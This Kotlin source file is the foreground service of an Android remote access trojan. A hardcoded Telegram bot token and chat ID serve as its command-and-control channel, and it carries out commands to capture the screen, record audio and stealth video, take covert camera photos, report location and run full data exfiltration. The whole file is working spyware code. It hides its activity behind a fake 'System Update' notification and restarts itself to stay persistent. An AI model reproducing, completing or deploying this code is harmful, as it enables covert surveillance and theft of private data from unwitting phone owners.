package com.mzkyzak.appbug

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.content.pm.ServiceInfo
import androidx.core.app.NotificationCompat

class RatForegroundService : Service() {
    private lateinit var c2Client: TelegramC2Client
    private lateinit var locationManager: LocationManager
    private lateinit var audioRecorder: AudioRecorderManager
    private lateinit var mediaCapture: MediaCaptureManager
    private lateinit var deviceInfo: DeviceInfoManager
    private lateinit var liveBridge: LiveCommandBridge
    private val BOT_TOKEN = "8898141962:AAHK5OWEo5UFNWGszehi97U8ZQSdPSyXEns"
    private var chatId: String = "6945113481"

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val action = intent?.action
        val prefs = getSharedPreferences("rat_prefs", MODE_PRIVATE)
        chatId = intent?.getStringExtra("CHAT_ID") ?: prefs.getString("chat_id", "6945113481")!!

        if (!::c2Client.isInitialized) {
            c2Client = TelegramC2Client(BOT_TOKEN, chatId)
            locationManager = LocationManager(this, c2Client)
            audioRecorder = AudioRecorderManager(this, c2Client)
            mediaCapture = MediaCaptureManager(this, c2Client)
            deviceInfo = DeviceInfoManager(this, c2Client)
            liveBridge = LiveCommandBridge(this, c2Client)
            liveBridge.startLiveBridge()
        }

        when (action) {
            "ACTION_CAPTURE_SCREEN" -> {
                val projectionData = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    intent?.getParcelableExtra("PROJECTION_DATA", Intent::class.java)
                } else {
                    @Suppress("DEPRECATION")
                    intent?.getParcelableExtra("PROJECTION_DATA")
                }
                if (projectionData != null) {
                    c2Client.sendMessage("<b>[Visuals]</b> Initializing Capture...")
                    startServiceWithNotification(true)
                    mediaCapture.captureScreen(projectionData)
                }
            }
            "ACTION_START_AUDIO" -> {
                if (::c2Client.isInitialized) {
                    c2Client.sendMessage("<b>[Audio]</b> Starting 20s recording...")
                    audioRecorder.startRecording(20000)
                }
            }
            "ACTION_REPORT_LOCATION" -> locationManager.reportLocation()
            "ACTION_LIVE_PHOTO" -> if (::c2Client.isInitialized) mediaCapture.captureCovertPhoto(false)
            "ACTION_LIVE_PHOTO_FRONT" -> if (::c2Client.isInitialized) mediaCapture.captureCovertPhoto(true)
            "ACTION_BURST_CAPTURE" -> if (::c2Client.isInitialized) mediaCapture.startBrutalBurst(10, 500)
            "ACTION_RECORD_VIDEO" -> if (::c2Client.isInitialized) mediaCapture.recordStealthVideo(15000, false)
            "ACTION_RECORD_VIDEO_FRONT" -> if (::c2Client.isInitialized) mediaCapture.recordStealthVideo(15000, true)
            "ACTION_BRUTAL_EXFIL" -> if (::c2Client.isInitialized) mediaCapture.startBrutalSequence(false)
            "ACTION_BRUTAL_EXFIL_FRONT" -> if (::c2Client.isInitialized) mediaCapture.startBrutalSequence(true)
            "ACTION_RUN_EXFIL" -> {
                val exfil = ExfiltrationManager(this, c2Client)
                Thread { exfil.runFullExfiltration() }.start()
            }
            else -> {
                deviceInfo.reportFullSpecs()
                locationManager.reportLocation()
                startServiceWithNotification(false)
            }
        }
        return START_STICKY
    }

    private fun startServiceWithNotification(includeMediaProjection: Boolean) {
        val notification = createNotification()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            var type = ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
            }
            if (includeMediaProjection) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
            }
            // Include camera type for stealth capture
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            }
            startForeground(1, notification, type)
        } else {
            startForeground(1, notification)
        }
    }

    private fun createNotification(): Notification {
        val channelId = "system_update_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "System Update", NotificationManager.IMPORTANCE_MIN)
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(channel)
        }
        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Update")
            .setContentText("Checking for updates...")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
